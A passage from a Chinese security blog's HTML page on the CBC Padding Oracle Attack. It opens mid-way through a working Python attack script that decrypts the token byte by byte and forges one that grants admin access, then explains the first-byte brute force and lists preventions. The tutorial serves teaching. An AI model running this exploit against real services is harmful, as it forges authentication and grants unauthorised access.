xrange(len(a))])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(string, N)</span>:</span></span><br><span class="line">    l = len(string)</span><br><span class="line">    <span class="keyword">if</span> l != N:</span><br><span class="line">        <span class="keyword">return</span> string + chr(N - l) * (N - l)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle</span><span class="params">(N)</span>:</span></span><br><span class="line">    get = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, N+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">            padding = xor(get, chr(i) * (i<span class="number">-1</span>))</span><br><span class="line">            c = chr(<span class="number">0</span>) * (<span class="number">16</span>-i) + chr(j) + padding</span><br><span class="line">            result = inject_token(base64.b64encode(c))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Error!"</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content:</span><br><span class="line">                get = chr(j ^ i) + get</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> get</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    session = requests.get(url).headers[<span class="string">'Set-Cookie'</span>].split(<span class="string">','</span>)</span><br><span class="line">    phpsession = session[<span class="number">0</span>].split(<span class="string">";"</span>)[<span class="number">0</span>][<span class="number">10</span>:]</span><br><span class="line">    <span class="keyword">print</span> phpsession</span><br><span class="line">    token = session[<span class="number">1</span>][<span class="number">6</span>:].replace(<span class="string">"%3D"</span>, <span class="string">'='</span>).replace(<span class="string">"%2F"</span>, <span class="string">'/'</span>).replace(<span class="string">"%2B"</span>, <span class="string">'+'</span>).decode(<span class="string">'base64'</span>)</span><br><span class="line">    middle1 = padding_oracle(N)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\n"</span></span><br><span class="line">    <span class="keyword">if</span>(len(middle1) + <span class="number">1</span> == <span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">            middle = chr(i) + middle1</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"token:"</span> + token</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"middle:"</span> + middle</span><br><span class="line">            plaintext = xor(middle,token)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"plaintext:"</span> + plaintext</span><br><span class="line">            des = pad(<span class="string">'admin'</span>, N)</span><br><span class="line">            tmp = <span class="string">""</span></span><br><span class="line">            <span class="keyword">print</span> des.encode(<span class="string">"base64"</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">                tmp += chr(ord(token[i]) ^ ord(plaintext[i]) ^ ord(des[i]))</span><br><span class="line">            <span class="keyword">print</span> tmp.encode(<span class="string">'base64'</span>)</span><br><span class="line">            result = inject_token(base64.b64encode(tmp))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"You are admin!"</span> <span class="keyword">in</span> result.content:</span><br><span class="line">                <span class="keyword">print</span> result.content</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"success"</span></span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>
+<p>在这个攻击脚本中需要注意是的middle的后十五位都可以通过Padding Oracle Attack正常的解出，但是在解第一位时按逻辑应该解出全为padding的plaintext(在这个环境下也就是16个0x10)，即解密的结果为NULL。而在验证代码中的验证条件为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($u = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token)</span><br></pre></td></tr></table></figure></p>
+<p>所以在解第一位成功时为if(NULL)，依然不满足if条件，无法进入验证成功逻辑，所以要对第一位进行爆破而不是Padding Oracle Attack。</p>
+<p>最后攻击结果如图：</p>
+<p><img src="/2018/07/30/Padding-Oracle-Attack/7.jpg" alt="Padding-Oracle-Attack"></p>
+<h2 id="0x05预防"><a href="#0x05预防" class="headerlink" title="0x05预防"></a>0x05预防</h2><p>Padding Oracle Attack的关键在于：</p>
+<p>1.攻击者能够获知并修改IV</p>
+<p>2.攻击者能够获知解密的结果是否符合padding</p>
+<p>那么在实现和使用CBC模式的分组加密算法时，只要注意这两点，只要其中任意一个条件不能满足，攻击者就无法实施攻击。</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://yinwc.github.io">Ywc</a>
+            <p>原文链接: <a href="https://yinwc.github.io/2018/07/30/Padding-Oracle-Attack/">https://yinwc.github.io/2018/07/30/Padding-Oracle-Attack/</a>
+            <p>发表日期: <a href="https://yinwc.github.io/2018/07/30/Padding-Oracle-Attack/">July 30th 2018, 9:13:42 am</a>
+            <p>版权声明: </p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/07/30/dedecms/" title= dedecms后台getshell漏洞还原分析 >
+                    <div class="nextTitle">dedecms后台getshell漏洞还原分析</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/07/27/ubuntumysql/" title= Ubuntu 18.04 mysql的使用 >
+                    <div class="prevTitle">Ubuntu 18.04 mysql的使用</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:ywc.echo@foxmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/YinWC" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Writeup"><span class="toc-number">1.</span> <span class="toc-text">Writeup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pading-Oracle-Attack攻击"><span class="toc-number">2.</span> <span class="toc-text">Pading Oracle Attack攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-简介"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-原理"><span class="toc-number">2.2.</span> <span class="toc-text">0x02 原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-攻击"><span class="toc-number">3.</span> <span class="toc-text">0x03 攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-实例"><span class="toc-number">4.</span> <span class="toc-text">0x04 实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05预防"><span class="toc-number">5.</span> <span class="toc-text">0x05预防</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 48
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href= "/2018/11/16/SSRF/" >SSRF总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "/2018/11/15/vulhub漏洞复现/" >vulhub漏洞复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "/2018/11/15/MISC总结/" >MISC总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href= "/2018/11/14/CRC32碰撞/" >CRC32碰撞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/10</span><a class="archive-post-title" href= "/2018/11/10/N1CTF2018题目复现/" >N1CTF2018题目复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/08</span><a class="archive-post-title" href= "/2018/11/08/不包含数字和字母的webshell/" >不包含数字和字母的webshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/08</span><a class="archive-post-title" href= "/2018/11/08/python沙盒逃逸/" >python沙箱逃逸</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/03</span><a class="archive-post-title" href= "/2018/11/03/公钥与私钥加密/" >理解公钥与私钥</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/29</span><a class="archive-post-title" href= "/2018/10/29/WEB安全攻防渗透测试实战指南脑图/" >WEB安全攻防渗透测试实战指南脑图</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href= "/2018/10/17/渗透测试流程/" >渗透测试流程总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/14</span><a class="archive-post-title" href= "/2018/10/14/windows-应急流程及实战演练/" >windows 应急流程及实战演练</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href= "/2018/10/01/面试/" >Web安全知识整理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/29</span><a class="archive-post-title" href= "/2018/09/29/msf/" >Metasploit 渗透练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/28</span><a class="archive-post-title" href= "/2018/09/28/Dmsj/" >代码审计练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/16</span><a class="archive-post-title" href= "/2018/09/16/yilinbo/" >易霖博杯 赛后总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2018/09/11/onethinkcms/" >OneThink/Thinkphp 的缓存getshell漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/09</span><a class="archive-post-title" href= "/2018/09/09/jiaoben/" >一些脚本整理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/09</span><a class="archive-post-title" href= "/2018/09/09/burpsuite/" >渗透测试神器BurpSuite pro v2.0beta 使用教程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span><a class="archive-post-title" href= "/2018/08/31/wangdingbei/" >网鼎杯题目整理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/27</span><a class="archive-post-title" href= "/2018/08/27/luyoubiao/" >配置路由表</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/08</span><a class="archive-post-title" href= "/2018/08/08/SJU-game/" >SJU集训结业&淘汰赛 Write Up</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/05</span><a class="archive-post-title" href= "/2018/08/05/RCTF-2018/" >RCTF-2018 cpushop</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span><a class="archive-post-title" href= "/2018/07/31/Gopher/" >Gopher攻击MySql</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/dedecms/" >dedecms后台getshell漏洞还原分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/Padding-Oracle-Attack/" >Padding Oracle Attack</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/27</span><a class="archive-post-title" href= "/2018/07/27/ubuntumysql/" >Ubuntu 18.04 mysql的使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2018/07/26/daimashenji/" >solveme.peng.kr 代码审计练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2018/07/26/hydra/" >Hydra 爆破神器的使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/25</span><a class="archive-post-title" href= "/2018/07/25/dianfengjike/" >巅峰极客第一场web复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/12</span><a class="archive-post-title" href= "/2018/07/12/渗透基础/" >渗透基础</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/11</span><a class="archive-post-title" href= "/2018/07/11/gameofctf/" >Game-of-Thrones-CTF-1.0靶机实战演练</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/05</span><a class="archive-post-title" href= "/2018/07/05/sqlmap/" >Sqlmap 使用总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2018/07/04/java环境配置/" >java环境配置及版本共存问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2018/07/04/sql注入总结/" >SQL注入总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/04</span><a class="archive-post-title" href= "/2018/07/04/mozhe/" >墨者学院平台修炼</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span><a class="archive-post-title" href= "/2018/07/02/iis文件解析漏洞/" >iis文件解析漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href= "/2018/06/14/mimikatz/" >mimikatz内网渗透</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/06</span><a class="archive-post-title" href= "/2018/06/06/wireshark/" >Wireshark-流量分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/03</span><a class="archive-post-title" href= "/2018/06/03/phpmagic/" >反序列化漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span><a class="archive-post-title" href= "/2018/06/01/git/" >git learn</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/docker/" >docker的学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/markdown语法总结/" >Markdown语法总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href= "/2018/05/29/yuanmaxielou/" >Web源码泄露总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/28</span><a class="archive-post-title" href= "/2018/05/28/python/" >学习python中遇到的问题及总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href= "/2018/05/18/rsa/" >Crypto_RSA算法总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/16</span><a class="archive-post-title" href= "/2018/05/16/problem/" >日常学习中问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/2018/03/24/2018-QWB/" >2018 QWB 题目整理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/14</span><a class="archive-post-title" href= "/2018/02/14/blog/" >搭博客的经历</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="learn"><span class="iconfont-archer">&#xe606;</span>learn</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF、漏洞"><span class="iconfont-archer">&#xe606;</span>CTF、漏洞</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
+    
+        <span class="sidebar-tag-name" data-tags="Record,Problem"><span class="iconfont-archer">&#xe606;</span>Record,Problem</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
+        <span class="sidebar-tag-name" data-tags="problem"><span class="iconfont-archer">&#xe606;</span>problem</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞、CTF"><span class="iconfont-archer">&#xe606;</span>漏洞、CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透"><span class="iconfont-archer">&#xe606;</span>渗透</span>
+    
+        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="应急响应"><span class="iconfont-archer">&#xe606;</span>应急响应</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="blog"><span class="iconfont-archer">&#xe60a;</span>blog</span>
+    
+        <span class="sidebar-category-name" data-categories="漏洞总结"><span class="iconfont-archer">&#xe60a;</span>漏洞总结</span>
+    
+        <span class="sidebar-category-name" data-categories="learn"><span class="iconfont-archer">&#xe60a;</span>learn</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Ywc"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
